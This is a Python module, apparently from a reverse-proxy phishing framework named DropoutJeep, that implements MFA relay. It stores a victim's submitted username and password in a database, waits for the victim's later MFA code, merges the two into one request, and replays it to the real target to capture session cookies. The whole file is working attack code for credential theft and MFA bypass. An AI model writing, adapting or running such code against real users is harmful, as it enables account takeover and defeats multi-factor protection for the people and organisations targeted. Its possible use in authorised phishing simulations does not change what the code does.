"""MFA relay state + body construction for reverse-proxy campaigns.

When a victim submits username+password on one request, then an MFA code on a
later request, DropoutJeep can replay the full credential set to the real
target, capture the resulting session cookies, and return the target's success
response to the victim.

State is persisted to the database with TTL-based expiry so it survives
process restarts.  When no Flask app context is available (e.g. the standalone
async proxy server), a fresh SQLAlchemy session is created from ``DATABASE_URL``.
"""

import json
import logging
import os
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from urllib.parse import urlencode

from .credentials import (
    DEFAULT_MFA_FIELDS,
    DEFAULT_PASSWORD_FIELDS,
    DEFAULT_USERNAME_FIELDS,
    _matches,
    extract_credentials,
    parse_post_body,
)

logger = logging.getLogger(__name__)

DEFAULT_TTL_SECONDS = 300


@dataclass
class PartialAuth:
    """First-stage credentials captured while waiting for MFA code."""

    username_field: str | None = None
    username_value: str | None = None
    password_field: str | None = None
    password_value: str | None = None
    path: str | None = None
    created_at: float = field(default_factory=time.time)

    def is_complete(self) -> bool:
        return bool(self.password_value and self.username_value)


def _get_database_url() -> str:
    url = os.environ.get("DATABASE_URL", "sqlite:///phish.db")
    if url.startswith("sqlite:///") and "?" not in url and "mode=ro" not in url:
        url = url + "?check_same_thread=false"
    return url


def _using_flask_session() -> bool:
    try:
        from flask import has_app_context
        return has_app_context()
    except Exception:
        return False


def _get_db_session():
    """Return a usable SQLAlchemy session.

    Prefer the Flask-SQLAlchemy scoped session when inside the Flask app;
    otherwise build a fresh session for the standalone async proxy server.
    """
    if _using_flask_session():
        from dropoutjeep_lib import db
        return db.session

    from sqlalchemy import create_engine
    from sqlalchemy.orm import sessionmaker
    engine = create_engine(_get_database_url())
    Session = sessionmaker(bind=engine)
    return Session()


class MfaRelayStore:
    """Database-backed store for per-recipient partial authentication state.

    Keys are (campaign_id, recipient_token_or_ip).  State expires after ``ttl``
    seconds to avoid unbounded growth.
    """

    def __init__(self, ttl: int = DEFAULT_TTL_SECONDS):
        self._ttl = ttl
        self._lock = threading.Lock()

    def _key(self, campaign_id: int, recipient_token: str | None, client_ip: str | None) -> tuple[int, str]:
        token = recipient_token or client_ip or ""
        return (campaign_id, token)

    def _prune_expired(self, session):
        from dropoutjeep_lib.models import MfaRelayState
        cutoff = datetime.utcnow()
        try:
            session.query(MfaRelayState).filter(MfaRelayState.expires_at < cutoff).delete(
                synchronize_session=False
            )
            session.commit()
        except Exception:
            session.rollback()
            logger.exception("Failed to prune expired MFA relay state")

    def _row_to_partial(self, row) -> PartialAuth:
        return PartialAuth(
            username_field=row.username_field,
            username_value=row.username_value,
            password_field=row.password_field,
            password_value=row.password_value,
            path=row.path,
            created_at=row.created_at.timestamp() if row.created_at else time.time(),
        )

    def store(self, campaign_id: int, recipient_token: str | None, client_ip: str | None,
              path: str, fields: dict, username_fields: list[str] | None = None,
              password_fields: list[str] | None = None):
        """Store stage-1 credentials if a username+password pair is present."""
        password_fields = password_fields or DEFAULT_PASSWORD_FIELDS
        username_fields = username_fields or DEFAULT_USERNAME_FIELDS

        found = extract_credentials(fields, password_fields=password_fields, mfa_fields=[])
        password_items = [f for f in found if f["type"] == "password"]
        if not password_items:
            return

        username_field = None
        username_value = None
        if username_fields:
            for name, value in fields.items():
                if not value or not isinstance(value, (str, int)):
                    continue
                if _matches(name, username_fields):
                    username_field = name
                    username_value = str(value)
                    break

        password_item = password_items[0]
        token = recipient_token or client_ip or ""
        expires_at = datetime.utcnow() + timedelta(seconds=self._ttl)

        session = _get_db_session()
        owns_session = not _using_flask_session()
        try:
            from dropoutjeep_lib.models import MfaRelayState
            self._prune_expired(session)
            # Upsert by campaign_id + token/ip key.
            row = session.query(MfaRelayState).filter_by(
                campaign_id=campaign_id, recipient_token=token
            ).first()
            if row:
                row.username_field = username_field
                row.username_value = username_value
                row.password_field = password_item["field"]
                row.password_value = password_item["value"]
                row.path = path
                row.expires_at = expires_at
            else:
                row = MfaRelayState(
                    campaign_id=campaign_id,
                    recipient_token=token,
                    client_ip=client_ip,
                    username_field=username_field,
                    username_value=username_value,
                    password_field=password_item["field"],
                    password_value=password_item["value"],
                    path=path,
                    expires_at=expires_at,
                )
                session.add(row)
            session.commit()
            logger.debug("Stored MFA stage-1 state for campaign %s key %s", campaign_id, (campaign_id, token))
        except Exception:
            session.rollback()
            logger.exception("Failed to store MFA relay state")
        finally:
            if owns_session:
                session.close()

    def get(self, campaign_id: int, recipient_token: str | None, client_ip: str | None) -> PartialAuth | None:
        token = recipient_token or client_ip or ""
        session = _get_db_session()
        owns_session = not _using_flask_session()
        try:
            from dropoutjeep_lib.models import MfaRelayState
            self._prune_expired(session)
            row = session.query(MfaRelayState).filter_by(
                campaign_id=campaign_id, recipient_token=token
            ).first()
            if row is None or row.is_expired():
                if row and row.is_expired():
                    session.delete(row)
                    session.commit()
                return None
            return self._row_to_partial(row)
        except Exception:
            session.rollback()
            logger.exception("Failed to retrieve MFA relay state")
            return None
        finally:
            if owns_session:
                session.close()

    def clear(self, campaign_id: int, recipient_token: str | None, client_ip: str | None):
        token = recipient_token or client_ip or ""
        session = _get_db_session()
        owns_session = not _using_flask_session()
        try:
            from dropoutjeep_lib.models import MfaRelayState
            session.query(MfaRelayState).filter_by(
                campaign_id=campaign_id, recipient_token=token
            ).delete(synchronize_session=False)
            session.commit()
        except Exception:
            session.rollback()
            logger.exception("Failed to clear MFA relay state")
        finally:
            if owns_session:
                session.close()


# Shared process-wide store.  A future Redis-backed implementation can replace
# this instance without changing call sites.
mfa_relay_store = MfaRelayStore()


def _find_mfa_field(fields: dict, mfa_fields: list[str]) -> tuple[str, str] | None:
    for name, value in fields.items():
        if not value or not isinstance(value, (str, int)):
            continue
        for candidate in mfa_fields:
            lowered = name.lower()
            if lowered == candidate or lowered.endswith("[" + candidate + "]") or lowered.endswith("_" + candidate):
                return name, str(value)
    return None


def _find_username_field(fields: dict, username_fields: list[str]) -> tuple[str, str] | None:
    for name, value in fields.items():
        if not value or not isinstance(value, (str, int)):
            continue
        if _matches(name, username_fields):
            return name, str(value)
    return None


def extract_auth_fields(body: bytes, content_type: str | None, config: dict) -> dict:
    """Parse a POST body and classify contained credential fields."""
    username_fields = config.get("username_field_names") or DEFAULT_USERNAME_FIELDS
    password_fields = config.get("password_field_names") or DEFAULT_PASSWORD_FIELDS
    mfa_fields = config.get("mfa_field_names") or DEFAULT_MFA_FIELDS

    fields = parse_post_body(body, content_type)
    if not fields:
        return {"fields": {}, "has_password": False, "has_mfa": False}

    username_item = _find_username_field(fields, username_fields)
    password_items = [
        item for item in extract_credentials(fields, password_fields=password_fields, mfa_fields=[])
        if item["type"] == "password"
    ]
    mfa_item = _find_mfa_field(fields, mfa_fields)

    return {
        "fields": fields,
        "username": username_item[1] if username_item else None,
        "username_field": username_item[0] if username_item else None,
        "password_field": password_items[0]["field"] if password_items else None,
        "password_value": password_items[0]["value"] if password_items else None,
        "mfa_field": mfa_item[0] if mfa_item else None,
        "mfa_value": mfa_item[1] if mfa_item else None,
        "has_password": bool(password_items),
        "has_mfa": bool(mfa_item),
    }


def build_relay_body(partial: PartialAuth, current_fields: dict, content_type: str | None,
                     body: bytes) -> tuple[bytes, str | None]:
    """Combine stored stage-1 credentials with the current MFA request body.

    Returns ``(relay_body, relay_content_type)``.  ``relay_content_type`` is
    ``None`` when the original content type can be reused, otherwise the new
    value to set on the forwarded request (e.g. when falling back from
    multipart to urlencoded).
    """
    ct = (content_type or "").lower()
    relay_fields = dict(current_fields)

    if partial.username_field and partial.username_value is not None:
        relay_fields[partial.username_field] = partial.username_value
    if partial.password_field and partial.password_value is not None:
        relay_fields[partial.password_field] = partial.password_value

    try:
        if "application/json" in ct:
            return json.dumps(relay_fields, default=str).encode("utf-8"), None
        if "multipart/form-data" in ct:
            # multipart is unusual for auth; fall back to urlencoded.
            logger.warning("MFA relay falling back from multipart to form-urlencoded")
            return urlencode(relay_fields).encode("utf-8"), "application/x-www-form-urlencoded"
        # Default to form-urlencoded.
        return urlencode(relay_fields).encode("utf-8"), None
    except Exception:
        logger.exception("Failed to build MFA relay body, forwarding original")
        return body, None


def prepare_relay_body(campaign_id: int, recipient_token: str | None, client_ip: str | None,
                       method: str, path: str, body: bytes, content_type: str | None,
                       config: dict,
                       store: MfaRelayStore | None = None) -> tuple[bytes, str | None, bool]:
    """Return ``(body_to_forward, content_type_to_forward, did_relay)``.

    If the request is stage 1 (password, no MFA), store partial state and
    return the original body.  If the request is stage 2 (MFA code and stored
    password), build and return a combined relay body.
    """
    store = store or mfa_relay_store

    if method.upper() != "POST":
        return body, None, False

    if not config.get("mfa_relay_enabled"):
        return body, None, False

    username_fields = config.get("username_field_names") or DEFAULT_USERNAME_FIELDS
    password_fields = config.get("password_field_names") or DEFAULT_PASSWORD_FIELDS
    mfa_fields = config.get("mfa_field_names") or DEFAULT_MFA_FIELDS

    parsed = extract_auth_fields(body, content_type, config)
    fields = parsed["fields"]
    if not fields:
        return body, None, False

    # Stage 2: MFA code present and we have stored credentials.
    if parsed["has_mfa"]:
        partial = store.get(campaign_id, recipient_token, client_ip)
        if partial and partial.password_value:
            relay_body, relay_ct = build_relay_body(partial, fields, content_type, body)
            store.clear(campaign_id, recipient_token, client_ip)
            logger.info(
                "MFA relay triggered for campaign %s path %s recipient %s",
                campaign_id, path, recipient_token or client_ip,
            )
            return relay_body, relay_ct, True
        logger.debug("MFA field seen but no stored stage-1 state for campaign %s", campaign_id)

    # Stage 1: store username/password for later MFA replay.
    if parsed["has_password"]:
        store.store(
            campaign_id, recipient_token, client_ip, path, fields,
            username_fields=username_fields, password_fields=password_fields,
        )

    return body, None, False
